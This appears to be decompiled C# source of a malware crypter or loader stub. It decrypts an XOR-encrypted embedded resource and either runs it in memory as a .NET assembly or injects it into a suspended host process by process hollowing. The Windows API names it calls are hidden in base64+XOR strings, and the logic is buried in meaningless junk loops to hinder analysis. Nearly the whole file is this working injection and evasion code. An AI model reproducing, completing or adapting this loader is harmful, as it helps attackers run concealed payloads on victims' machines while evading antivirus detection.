using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using ns4;
using ns6;

namespace ns1;

[StandardModule]
internal sealed class Class5
{
	public delegate bool Delegate0(string string_0, string string_1, IntPtr intptr_0, IntPtr intptr_1, bool bool_0, int int_0, IntPtr intptr_2, string string_2, byte[] byte_0, IntPtr[] intptr_3);

	public delegate bool Delegate1(IntPtr intptr_0, uint[] uint_0);

	public delegate bool Delegate2(IntPtr intptr_0, IntPtr intptr_1, ref IntPtr intptr_2, IntPtr intptr_3, ref IntPtr intptr_4);

	public delegate uint Delegate3(IntPtr intptr_0, IntPtr intptr_1);

	public delegate IntPtr Delegate4(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, int int_0, int int_1);

	public delegate bool Delegate5(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, IntPtr intptr_2, ref IntPtr intptr_3);

	public delegate int Delegate6(IntPtr intptr_0);

	private static string string_0;

	private static uint uint_0;

	private static DateTime dateTime_0;

	private static string string_1;

	private static ulong ulong_0;

	private static ulong ulong_1;

	private static DateTime dateTime_1;

	private static byte byte_0;

	private static decimal decimal_0;

	static Class5()
	{
		GClass11.smethod_0();
		try
		{
			string_0 = "AR',";
			uint_0 = 515681004u;
			dateTime_0 = default(DateTime);
			string_1 = "~]fZL*^gY~75";
			ulong_0 = 1896646049uL;
			ulong_1 = 0uL;
			dateTime_1 = DateTime.Now;
			byte_0 = 92;
			decimal_0 = new decimal(-111912477L);
		}
		catch (Exception exception_)
		{
			GClass6.smethod_0(exception_);
			throw;
		}
	}

	public static byte[] smethod_0(byte[] byte_1)
	{
		checked
		{
			byte[] array = default(byte[]);
			byte[] array2 = default(byte[]);
			int num = default(int);
			int num2 = default(int);
			bool flag = default(bool);
			double num3 = default(double);
			sbyte b = default(sbyte);
			int num4 = default(int);
			int num5 = default(int);
			int i = default(int);
			byte[] array3 = default(byte[]);
			try
			{
				array = new byte[19]
				{
					53, 57, 129, 37, 11, 36, 92, 253, 141, 242,
					141, 238, 227, 184, 26, 70, 163, 117, 182
				};
				array2 = array;
				num = -473604613;
				num2 = 6;
				do
				{
					flag = true;
					num2++;
				}
				while (num2 <= 114);
				num3 = 5.0;
				do
				{
					b = 2;
					do
					{
						b = (sbyte)unchecked(b + 1);
					}
					while (b <= 90);
					num3 += 1.0;
				}
				while (!(num3 > 37.0));
				num4 = array2.Length;
				num5 = byte_1.Length - 1;
				for (i = 0; i <= num5; i++)
				{
					byte_1[i] = unchecked((byte)(byte_1[i] ^ array2[i % num4]));
				}
				array3 = byte_1;
				return array3;
			}
			catch (Exception exception_)
			{
				GClass6.smethod_11(exception_, new object[12]
				{
					array3, num4, num, array2, flag, num2, num3, b, i, array,
					num5, byte_1
				});
				throw;
			}
		}
	}

	public static string smethod_1(string string_2, decimal decimal_1, float float_0)
	{
		double num = default(double);
		bool flag = default(bool);
		decimal num3 = default(decimal);
		decimal num4 = default(decimal);
		bool flag2 = default(bool);
		uint num5 = default(uint);
		string @string = default(string);
		try
		{
			num = -9535.0;
			flag = true;
			decimal num2 = new decimal(13L);
			num3 = new decimal(59L);
			num4 = num2;
			while (ForLoopControl.ForNextCheckDec(num4, num3, 1m))
			{
				flag2 = true;
				num5 = 8u;
				do
				{
					num5 = checked(num5 + 1u);
				}
				while (num5 <= 50);
				num4 = decimal.Add(num4, 1m);
			}
			@string = Encoding.UTF8.GetString(smethod_0(Convert.FromBase64String(string_2)));
			return @string;
		}
		catch (Exception exception_)
		{
			long num6 = default(long);
			long num7 = default(long);
			byte b = default(byte);
			GClass6.smethod_11(exception_, new object[13]
			{
				num6, @string, num, flag, num4, flag2, num5, num7, b, num3,
				string_2, decimal_1, float_0
			});
			throw;
		}
	}

	public static int smethod_2(int int_0, double double_0, byte[] byte_1, ulong ulong_2, decimal decimal_1)
	{
		checked
		{
			string text = default(string);
			int i = default(int);
			int length = default(int);
			char c = default(char);
			short num = default(short);
			DateTime now = default(DateTime);
			byte b = default(byte);
			int num2 = default(int);
			Color color = default(Color);
			int num3 = default(int);
			try
			{
				text = "NG5c";
				i = 0;
				for (length = text.Length; i < length; i++)
				{
					c = text[i];
					num = 2;
					do
					{
						now = DateTime.Now;
						b = 13;
						do
						{
							b = (byte)unchecked((uint)(b + 1));
						}
						while (unchecked((uint)b) <= 62u);
						num = (short)unchecked(num + 1);
					}
					while (num <= 46);
				}
				num2 = -620979178;
				color = Color.FromArgb(byte_1[int_0 + 3], byte_1[int_0 + 2], byte_1[int_0 + 1], byte_1[int_0]);
				num3 = color.ToArgb();
				return num3;
			}
			catch (Exception exception_)
			{
				GClass6.smethod_11(exception_, new object[15]
				{
					num3, num2, c, now, num, b, i, text, length, color,
					int_0, double_0, byte_1, ulong_2, decimal_1
				});
				throw;
			}
		}
	}

	public static byte[] smethod_3(int int_0)
	{
		bool flag = default(bool);
		sbyte b = default(sbyte);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		long num = default(long);
		bool flag4 = default(bool);
		bool flag5 = default(bool);
		uint num2 = default(uint);
		Color color = default(Color);
		byte[] array = default(byte[]);
		byte[] array2 = default(byte[]);
		try
		{
			flag = false;
			b = -43;
			flag2 = true;
			flag3 = true;
			num = 0L;
			flag4 = false;
			flag5 = true;
			num2 = 9u;
			do
			{
				num2 = checked(num2 + 1u);
			}
			while (num2 <= 107);
			color = Color.FromArgb(int_0);
			array = new byte[4] { color.B, color.G, color.R, color.A };
			array2 = array;
			return array2;
		}
		catch (Exception exception_)
		{
			byte b2 = default(byte);
			GClass6.smethod_11(exception_, new object[13]
			{
				flag, b, flag5, flag3, array2, color, flag2, b2, flag4, num,
				num2, array, int_0
			});
			throw;
		}
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr LoadLibrary(string string_2);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_2);

	public static xx47 smethod_4<xx47>(double double_0, short short_0, string string_2, uint uint_1, decimal decimal_1)
	{
		bool flag = default(bool);
		decimal num2 = default(decimal);
		decimal num3 = default(decimal);
		long num4 = default(long);
		char[] array = default(char[]);
		char[] array2 = default(char[]);
		xx47 val = default(xx47);
		try
		{
			flag = true;
			decimal num = new decimal(8L);
			num2 = new decimal(91L);
			num3 = num;
			while (ForLoopControl.ForNextCheckDec(num3, num2, 1m))
			{
				num3 = decimal.Add(num3, 1m);
			}
			num4 = 7L;
			do
			{
				num4 = checked(num4 + 1L);
			}
			while (num4 <= 21L);
			array = new char[1] { Convert.ToChar(58) };
			IntPtr intptr_ = LoadLibrary(string_2.Split(array)[0]);
			array2 = new char[1] { Convert.ToChar(58) };
			val = Conversions.ToGenericParameter<xx47>((object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(intptr_, string_2.Split(array2)[1]), typeof(xx47)));
			return val;
		}
		catch (Exception exception_)
		{
			bool flag2 = default(bool);
			GClass6.smethod_11(exception_, new object[13]
			{
				val, flag2, flag, num3, num4, num2, array, array2, double_0, short_0,
				string_2, uint_1, decimal_1
			});
			throw;
		}
	}

	public static void smethod_5(object object_0)
	{
		MethodInfo entryPoint = default(MethodInfo);
		bool flag = default(bool);
		float num = default(float);
		object[] array = default(object[]);
		try
		{
			entryPoint = Assembly.Load((byte[])object_0).EntryPoint;
			flag = true;
			num = -2852.603f;
			if (entryPoint.GetParameters().Length == 0)
			{
				entryPoint.Invoke(null, null);
				return;
			}
			MethodInfo methodInfo = entryPoint;
			array = new object[1] { new string[0] };
			methodInfo.Invoke(null, array);
		}
		catch (Exception exception_)
		{
			GClass6.smethod_5(exception_, num, entryPoint, flag, array, object_0);
			throw;
		}
	}

	public static void smethod_6(byte[] byte_1, string string_2, string string_3)
	{
		checked
		{
			ushort num = default(ushort);
			int num2 = default(int);
			byte b = default(byte);
			short num3 = default(short);
			Thread thread = default(Thread);
			byte b2 = default(byte);
			int i = default(int);
			string text = default(string);
			string[] directories = default(string[]);
			int j = default(int);
			string text2 = default(string);
			byte[] array = default(byte[]);
			byte[] array2 = default(byte[]);
			int[] array3 = default(int[]);
			int[] array4 = default(int[]);
			int num4 = default(int);
			int num5 = default(int);
			bool flag = default(bool);
			IntPtr intPtr = default(IntPtr);
			IntPtr[] array5 = default(IntPtr[]);
			IntPtr intPtr2 = default(IntPtr);
			uint[] array6 = default(uint[]);
			byte b3 = default(byte);
			ulong num6 = default(ulong);
			bool flag2 = default(bool);
			bool flag3 = default(bool);
			IntPtr intPtr3 = default(IntPtr);
			IntPtr intPtr4 = default(IntPtr);
			IntPtr intptr_3 = default(IntPtr);
			IntPtr intptr_4 = default(IntPtr);
			IntPtr intPtr5 = default(IntPtr);
			IntPtr intPtr6 = default(IntPtr);
			IntPtr intPtr7 = default(IntPtr);
			Delegate5 delegate3 = default(Delegate5);
			bool flag4 = default(bool);
			int[] array7 = default(int[]);
			int num7 = default(int);
			int k = default(int);
			byte[] array8 = default(byte[]);
			int num8 = default(int);
			string text3 = default(string);
			try
			{
				num = 20;
				do
				{
					num = (ushort)unchecked((uint)(num + 1));
				}
				while (unchecked((uint)num) <= 82u);
				num2 = 0;
				do
				{
					b = (byte)num2;
					num2++;
				}
				while (num2 <= 100);
				if (byte_1[60] == 128)
				{
					num3 = 2302;
					thread = new Thread(smethod_5);
					thread.SetApartmentState(ApartmentState.STA);
					b2 = 0;
					do
					{
						for (i = b2; i <= 30 && i != 25; i++)
						{
						}
						b2 = (byte)unchecked((uint)(b2 + 1));
					}
					while (unchecked((uint)b2) <= 20u);
					thread.Start(byte_1);
					return;
				}
				text = Assembly.GetEntryAssembly()!.Location;
				if (Directory.Exists(Conversions.ToString(Environment.SystemDirectory[0]) + smethod_1("D2XRV2RDLpzg0suHj91pZosNjgMQ", new decimal(-598616370L), 11893.742f)))
				{
					directories = Directory.GetDirectories(Conversions.ToString(Environment.SystemDirectory[0]) + smethod_1("D2XWTGVAM4r+rsCHgMp1NcwTwht3xHFXYi6c4Jf6gZHT", new decimal(142627215L), 28298f));
					for (j = 0; j < directories.Length; j++)
					{
						text2 = directories[j];
						if (text2.ToLower().Contains(smethod_1("QwuvFSU=", new decimal(1467175850L), 16346f)))
						{
							text = text2 + smethod_1("aVr3UXlBL9Poiug=", new decimal(1975927685L), -15507.07f);
							break;
						}
					}
				}
				array = new byte[6] { 0, 1, 2, 3, 4, 5 };
				array2 = array;
				array3 = new int[8] { 1, 16, 2, 32, 4, 64, 4, 64 };
				array4 = array3;
				num4 = smethod_2(60, -27798.6755, byte_1, 1955380560uL, new decimal(613282494L));
				num5 = BitConverter.ToInt16(byte_1, num4 + 6);
				flag = false;
				intPtr = new IntPtr(smethod_2(num4 + 84, 29826.8, byte_1, 2067639679uL, new decimal(-856766365L)));
				array5 = new IntPtr[4];
				flag = true;
				if (!smethod_4<Delegate0>(-7270.8292, 16960, smethod_1("XlzzS25Ib8+3sf+Lgsx/FtEa1VBK8mQ=", new decimal(676670201L), 0f), 163786346u, new decimal(454399433L))(null, text, intPtr2, intPtr2, bool_0: false, 4, intPtr2, null, new byte[0], array5))
				{
					return;
				}
				try
				{
					array6 = new uint[179];
					array6[0] = 65538u;
					b3 = 3;
					do
					{
						b3 = (byte)unchecked((uint)(b3 + 1));
					}
					while (unchecked((uint)b3) <= 93u);
					num6 = 201176287uL;
					if (smethod_4<Delegate1>(9349.5436, 8758, smethod_1("XlzzS25Ib8+3teiat9BoI8IR9VpX9UBzUA==", new decimal(2412295L), 27959.912f), 1780903494u, new decimal(646089563L))(array5[1], array6))
					{
						flag2 = false;
						flag3 = false;
						flag = false;
						Delegate2 @delegate = smethod_4<Delegate2>(0.0, 9593, smethod_1("XlzzS25Ib8+3oOiPh+hoKcAQxUZ05EhkViU=", new decimal(-906969280L), -3526.367f), 55121744u, new decimal(703121191L));
						IntPtr intptr_ = array5[0];
						intPtr3 = new IntPtr(unchecked((long)array6[41]) + 8L);
						IntPtr intptr_2 = intPtr3;
						intPtr4 = new IntPtr(4);
						if (@delegate(intptr_, intptr_2, ref intptr_3, intPtr4, ref intptr_4) && unchecked((long)smethod_4<Delegate3>(-25981.0, 22908, smethod_1("W03lSWceEonYnOCPk+5zI9Q60GZc4lFiSzI=", new decimal(252692485L), 22541f), 201871569u, new decimal(-305098023L))(array5[0], intptr_3)) == 0L)
						{
							Delegate4 delegate2 = smethod_4<Delegate4>(28118.8739, 16624, smethod_1("XlzzS25Ib8+3pOScl817KuIZ2lpaxF0=", new decimal(776445176L), 15528f), 1988890940u, new decimal(1665100293L));
							IntPtr intptr_5 = array5[0];
							intPtr5 = new IntPtr(smethod_2(num4 + 52, 0.0, byte_1, 0uL, new decimal(1596522774L)));
							IntPtr intptr_6 = intPtr5;
							intPtr6 = new IntPtr(smethod_2(num4 + 80, -26312.76, byte_1, 0uL, new decimal(-590587402L)));
							intPtr7 = delegate2(intptr_5, intptr_6, intPtr6, 12288, 64);
							delegate3 = smethod_4<Delegate5>(-15262.288, 25947, smethod_1("XlzzS25Ib8+3pf+Hl91KNMwW00ZKzEBmSy6E", new decimal(46808045L), 17057.115f), 1916180054u, new decimal(588305027L));
							array2 = null;
							flag4 = delegate3(array5[0], intPtr7, byte_1, intPtr, ref intptr_4);
							array7 = new int[10];
							flag = true;
							num7 = num5 - 1;
							for (k = 0; k <= num7; k++)
							{
								array7[0] = 13;
								array7[5] = 255 + array7[0];
								Buffer.BlockCopy(byte_1, num4 + 248 + k * 40, array7, 0, 40);
								array8 = new byte[array7[4] - 1 + 1];
								Buffer.BlockCopy(byte_1, array7[5], array8, 0, array8.Length);
								num8 = array7.Length;
								text3 = num8.ToString();
								Delegate5 delegate4 = delegate3;
								IntPtr intptr_7 = array5[0];
								intPtr6 = new IntPtr(intPtr7.ToInt32() + array7[3]);
								IntPtr intptr_8 = intPtr6;
								byte[] array9 = array8;
								intPtr5 = new IntPtr(array8.Length);
								flag4 = delegate4(intptr_7, intptr_8, array9, intPtr5, ref intptr_4);
							}
							flag = false;
							Delegate5 delegate5 = delegate3;
							IntPtr intptr_9 = array5[0];
							intPtr6 = new IntPtr(unchecked((long)array6[41]) + 8L);
							IntPtr intptr_10 = intPtr6;
							byte[] array10 = smethod_3(intPtr7.ToInt32());
							intPtr5 = new IntPtr(4);
							flag4 = delegate5(intptr_9, intptr_10, array10, intPtr5, ref intptr_4);
							array6[44] = (uint)(intPtr7.ToInt32() + smethod_2(num4 + 40, 0.0, byte_1, 1918295329uL, new decimal(1827724310L)));
							smethod_4<Delegate1>(0.0, 19648, smethod_1("XlzzS25Ib8+3oeiat9BoI8IR9VpX9UBzUA==", 0m, 16718.56f), 648190974u, new decimal(-285804695L))(array5[1], array6);
							smethod_4<Delegate6>(14583.21, 19470, smethod_1("XlzzS25Ib8+3oOidltV/EssH01Rd", new decimal(-703433091L), 11643.464f), 0u, 0m)(array5[1]);
							return;
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				Process.GetProcessById(array5[2].ToInt32()).Kill();
			}
			catch (Exception exception_)
			{
				GClass6.smethod_11(exception_, new object[44]
				{
					num, b, num2, num3, thread, b2, i, text, num4, flag,
					intPtr, array4, array5, num5, array2, text2, num6, intptr_3, flag4, intptr_4,
					array6, intPtr7, b3, flag2, flag3, array7, delegate3, k, text3, array8,
					j, directories, array, array3, intPtr2, intPtr3, intPtr4, intPtr5, intPtr6, num7,
					num8, byte_1, string_2, string_3
				});
				throw;
			}
		}
	}

	[STAThread]
	public static void Main()
	{
		GClass11.smethod_0();
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		decimal num5 = default(decimal);
		ResourceManager resourceManager = default(ResourceManager);
		float num6 = default(float);
		byte b = default(byte);
		ulong num7 = default(ulong);
		uint num8 = default(uint);
		decimal num10 = default(decimal);
		try
		{
			if (!GClass9.smethod_5())
			{
				return;
			}
			int try0010_dispatch = -1;
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					decimal num9;
					switch (try0010_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0018;
					case 263:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								default:
									goto end_IL_0010;
								case 1:
									break;
								case 0:
									goto end_IL_0010;
								}
							}
							int num4 = num2 + 1;
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0018;
							case 3:
								goto IL_0020;
							case 4:
								goto IL_0025;
							case 5:
								goto IL_0035;
							case 6:
								goto IL_0052;
							case 8:
								goto IL_0059;
							case 9:
								goto IL_0079;
							case 7:
								goto IL_0088;
							case 10:
								goto IL_00ac;
							case 11:
								goto end_IL_0010_2;
							default:
								goto end_IL_0010;
							case 0:
								goto end_IL_0010;
							case 12:
								goto end_IL_0010_3;
							}
							goto default;
						}
						IL_0059:
						num = 8;
						num5 = decimal.Add(num5, 1m);
						goto IL_0069;
						IL_00ac:
						num = 10;
						resourceManager = new ResourceManager("yetbcmt4", Assembly.GetExecutingAssembly());
						break;
						IL_0018:
						num = 2;
						num6 = -291.6f;
						goto IL_0020;
						IL_0020:
						num = 3;
						b = 54;
						goto IL_0025;
						IL_0025:
						num = 4;
						num7 = 17uL;
						goto IL_0035;
						IL_0035:
						do
						{
							num = 5;
							num7 = checked(num7 + 1uL);
						}
						while (num7 <= 75L);
						goto IL_0052;
						IL_0052:
						num = 6;
						num8 = 4u;
						goto IL_0088;
						IL_0088:
						num = 7;
						num9 = new decimal(4L);
						num10 = new decimal(21L);
						num5 = num9;
						goto IL_0069;
						IL_0069:
						if (ForLoopControl.ForNextCheckDec(num5, num10, 1m))
						{
							goto IL_0059;
						}
						goto IL_0079;
						IL_0079:
						num = 9;
						num8 = checked(num8 + 1u);
						if (num8 <= 28)
						{
							goto IL_0088;
						}
						goto IL_00ac;
						end_IL_0010_2:
						break;
					}
					num = 11;
					smethod_6(smethod_0((byte[])resourceManager.GetObject(smethod_1("RVroXz9KJow=", new decimal(2135197776L), 4329.208f))), "aDrx8", "<miETDOZQ");
					break;
					end_IL_0010:;
				}
				catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0010_dispatch = 263;
					continue;
				}
				throw ProjectData.CreateProjectError(-2146828237);
				continue;
				end_IL_0010_3:
				break;
			}
			if (num2 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception exception_)
		{
			sbyte b2 = default(sbyte);
			double num11 = default(double);
			GClass8.smethod_2(exception_, new object[12]
			{
				num6, b2, resourceManager, b, num11, num7, num8, num5, num10, num3,
				num2, num
			});
		}
	}
}
